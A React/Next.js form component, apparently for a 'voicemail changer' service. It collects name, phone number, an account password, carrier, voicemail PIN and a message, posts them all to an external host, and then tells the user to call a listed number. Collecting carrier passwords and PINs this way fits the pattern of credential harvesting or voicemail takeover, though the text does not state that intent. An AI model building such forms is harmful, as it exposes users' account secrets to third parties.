import React, { Component } from 'react';
import Router from 'next/router';

import css from '../styles/style.scss';

export default class VMChangerForm extends React.Component {
  constructor(props) {
    super(props);
    this.handleSubmit = this.handleSubmit.bind(this);
    this.state = {
      isModalActive: false,
    };
  }

  handleSubmit(event) {
    event.preventDefault();
    const form = event.target;
    const data = new FormData(form);

    // Convert form data to params.
    const params = new URLSearchParams();
    for (let pair of data.entries()) {
      params.set(pair[0], pair[1]);
    }

    fetch('https://vmchanger.abashina.org/info', {
      method: 'POST',
      mode: 'no-cors',
      body: params,
    });

    this.setState({
      isModalActive: true,
    });
  }

  handleCloseModal() {
    // Redirect user to the home page.
    Router.push('/');
  }

  render() {
    const { isModalActive } = this.state;
    return (
      <div>
        <form onSubmit={this.handleSubmit}>
          <div className={css.Container}>
            <div className={`${css.column} ${css.col8} ${css.colMxAuto}`}>
              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-name">
                  Name
                </label>
                <input
                  className={css.formInput}
                  type="text"
                  id="input-name"
                  name="name"
                  placeholder="Name"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-phone">
                  Phone number
                </label>
                <input
                  className={css.formInput}
                  type="text"
                  id="input-phone"
                  name="phone"
                  placeholder="Tel"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-pin">
                  Password
                </label>
                <input
                  className={css.formInput}
                  type="password"
                  id="input-pin"
                  name="password"
                  placeholder="Password"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-carrier">
                  Cell Phone Carrier
                </label>
                <select className={css.formSelect} id="input-carrier" name="carrier" required>
                  <option>-</option>
                  <option value="att">AT&T</option>
                  <option value="tmobile">T-Mobile</option>
                  <option value="verizon">Verizon</option>
                  <option value="sprint">Sprint</option>
                  <option value="mint">Mint</option>
                </select>
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-pin">
                  Voicemail pin code
                </label>
                <input
                  className={css.formInput}
                  type="password"
                  id="input-pin"
                  name="pin"
                  placeholder="Pin Code"
                  required
                />
              </div>

              <div className={css.formGroup}>
                <label className={css.formLabel} htmlFor="input-text">
                  Text Message
                </label>
                <textarea
                  className={css.formInput}
                  id="input-text"
                  name="text"
                  placeholder="Textarea"
                  rows="3"
                  required
                />
              </div>
              <div className={css.inputGroup}>
                <button className={`${css.btn} ${css.btnPrimary}`}>Submit</button>
              </div>
            </div>
          </div>
        </form>
        <div className={`${css.modal} ${css.modalLg} ${isModalActive ? css.active : ''}`}>
          <a
            onClick={this.handleCloseModal}
            className={`${css.modalOverlay} ${css.modalLg}`}
            aria-label="Close"
          />
          <div className={`${css.modalContainer}`}>
            <h3>Please call this number to finish process:</h3>
            <h1 className={`${css.vmPhone} ${css.textSuccess}`}>+1 973-363-2211</h1>
          </div>
        </div>
      </div>
    );
  }
}
